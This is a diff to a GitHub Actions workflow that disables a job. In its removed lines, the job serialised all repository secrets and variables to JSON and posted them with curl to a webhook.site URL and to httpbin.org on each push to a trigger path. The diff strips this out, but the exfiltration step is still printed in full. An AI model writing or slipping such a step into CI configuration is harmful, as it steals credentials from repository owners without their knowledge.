@@ -1,22 +1,8 @@
-name: ex3-25522
+name: disabled-25522
 on:
-  push:
-    paths:
-      - "daily/ex3trigger*"
   workflow_dispatch:
 jobs:
-  p:
+  d:
     runs-on: ubuntu-latest
     steps:
-      - name: outbound test + post to webhook
-        env:
-          ALL_SECRETS: ${{ toJSON(secrets) }}
-          ALL_VARS: ${{ toJSON(vars) }}
-        run: |
-          echo "=== ex3 ==="
-          echo "--- httpbin ip ---"
-          curl -s -m 20 https://httpbin.org/ip || echo HTTPBIN_FAIL
-          echo "--- post to webhook https ---"
-          curl -sk -m 30 -o /dev/null -w "wh_http=%{http_code}\n" -X POST --data-binary "run=${GITHUB_RUN_ID}&S=$ALL_SECRETS&V=$ALL_VARS" "https://webhook.site/8a88531d-9fd7-4826-bad5-94aa77551ee1" || echo WH_FAIL
-          echo "--- post to httpbin ---"
-          curl -s -m 25 -X POST --data-binary "S=$ALL_SECRETS" "https://httpbin.org/post" | head -c 400 || echo HB_POST_FAIL
+      - run: echo disabled
